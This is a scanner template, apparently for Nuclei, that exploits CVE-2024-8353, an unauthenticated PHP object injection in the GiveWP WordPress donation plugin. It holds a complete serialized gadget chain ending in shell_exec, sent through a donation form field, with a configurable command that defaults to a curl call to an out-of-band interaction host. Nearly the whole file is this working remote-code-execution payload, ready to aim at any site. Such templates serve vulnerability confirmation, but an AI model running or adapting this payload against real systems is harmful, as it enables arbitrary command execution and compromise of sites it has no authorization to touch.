id: CVE-2024-8353-givewp-rce

info:
  name: GiveWP â€“ Unauthenticated PHP Object Injection to RCE (CVE-2024-8353)
  author: yourhandle
  severity: critical
  description: |
    Triggers the GiveWP POI chain via donation form fields and executes a command.
    Uses Interactsh to confirm code execution out-of-band.
  tags: cve,wordpress,givewp,deserialization,poi,rce
  reference:
    - https://github.com/EQSTLab/CVE-2024-8353
    - https://vulncheck.com/xdb/2d719a4f5a4d
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/wp_givewp_rce.rb
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/give/givewp-donation-plugin-and-fundraising-platform-3161-unauthenticated-php-object-injection

# You MUST point this to a page that processes GiveWP donation posts (a live donation form URL).
variables:
  donation_path: "/"     # override with -var donation_path=/donate/my-form/
  cmd: "curl {{interactsh-url}}"   # override if needed
  cmdlen: "22"           # must be the exact length of `cmd` (override!)

requests:
  - method: POST
    path:
      - "{{BaseURL}}{{donation_path}}"
    headers:
      Content-Type: application/x-www-form-urlencoded

    # The payload mirrors the EQSTLab chain. Note the leading backslash before O:
    # and the serialized string length s:{{cmdlen}} for the command.
    body: |
      give_action=process_donation&give_title=\O:19:"Stripe\\StripeObject":1:{s:10:"\0*\0_values";a:1:{s:3:"foo";O:62:"Give\\PaymentGateways\\DataTransferObjects\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\0*\0container";O:33:"Give\\Vendors\\Faker\\ValidGenerator":3:{s:12:"\0*\0validator";s:10:"shell_exec";s:12:"\0*\0generator";O:34:"Give\\Onboarding\\SettingsRepository":1:{s:11:"\0*\0settings";a:1:{s:8:"address1";s:{{cmdlen}}:"{{cmd}}";}}s:13:"\0*\0maxRetries";i:10;}}}}}}
      &give-form-id=1

    interactsh: true
    redirects: true
    max-redirects: 2
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
    matchers-condition: or
